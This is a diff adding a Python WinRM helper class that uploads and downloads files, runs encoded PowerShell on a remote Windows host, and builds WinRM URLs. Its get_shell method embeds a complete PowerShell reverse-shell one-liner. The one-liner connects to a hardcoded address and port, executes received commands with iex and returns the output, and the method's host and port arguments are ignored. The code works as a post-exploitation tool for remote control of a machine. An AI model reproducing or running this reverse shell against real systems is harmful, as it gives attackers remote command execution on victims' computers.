@@ -1,0 +1,70 @@
+import binascii
+import struct
+from winrm.protocol import Protocol
+import re
+import base64
+
+
+class Session(object):
+    def __init__(self, target: str, auth: tuple, *args, **kwargs):
+        username, password = auth
+        self.url = self._build_url(target)
+        self.protocol = Protocol(self.url, username=username, password=password, **kwargs)
+
+    def upload_file(self, src_address: str, destination: str, chunk_size: int = 1024):
+        command = "[Byte[]]$to_write = [System.Convert]::FromBase64String('{}')\n$to_write|Add-Content -Encoding Byte {}"
+        with open(src_address, mode="rb") as f:
+            while chunk := f.read(chunk_size):
+                content = base64.standard_b64encode(chunk).decode()
+                content = command.format(content, destination)
+                std_out, std_err, status_code = self.run_ps(content)
+
+    def download_file(self, src_address: str, destination: str):
+        command = "$bytes = [system.io.file]::ReadAllBytes('{}')\n $bytes"
+        content = command.format(src_address)
+        std_out, std_err, status_code = self.run_ps(content)
+
+        content = std_out.strip().split(b"\r\n")
+        data_length = len(content)
+        data = binascii.a2b_hex("".join([hex(int(item)).replace("0x", "").zfill(2) for item in content]))
+        with open('{}'.format(destination), mode='wb') as f:
+            f.write(struct.pack('{}s'.format(data_length), data))
+
+    def get_shell(self, host: str, port: int):
+        command = "$client = New-Object Net.Sockets.TCPClient('192.168.70.129',12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+        # content = command.format(host, port)
+        std_out, std_err, status_code = self.run_ps(command)
+
+    def run_cmd(self, command, args=()):
+        shell_id = self.protocol.open_shell()
+        command_id = self.protocol.run_command(shell_id, command, args)
+        std_out, std_err, status_code = self.protocol.get_command_output(shell_id, command_id)
+        self.protocol.cleanup_command(shell_id, command_id)
+        self.protocol.close_shell(shell_id)
+        return std_out, std_err, status_code
+
+    def run_ps(self, script):
+        encoded_ps = base64.standard_b64encode(script.encode('utf_16_le')).decode('ascii')
+        std_out, std_err, status_code = self.run_cmd('powershell -encodedcommand {0}'.format(encoded_ps))
+        return std_out, std_err, status_code
+
+    @classmethod
+    def _build_url_mode(cls):
+        return re.compile(r'(?i)^((?P<scheme>http[s]?)://)?(?P<host>[0-9a-z-_.]+)(:(?P<port>\d+))?(?P<path>(/)?(wsman)?)?', re.I)
+
+    @classmethod
+    def _build_url(cls, target, transport=None):
+        pattern = cls._build_url_mode()
+        match = pattern.match(target)
+        scheme = match.group('scheme')
+        if not scheme:
+            scheme = 'https' if transport == 'ssl' else 'http'
+        host = match.group('host')
+        port = match.group('port')
+        if not port:
+            port = 5986 if transport == 'ssl' else 5985
+        path = match.group('path')
+        if not path:
+            path = 'wsman'
+        return '{0}://{1}:{2}/{3}'.format(scheme, host, port, path.lstrip('/'))
+
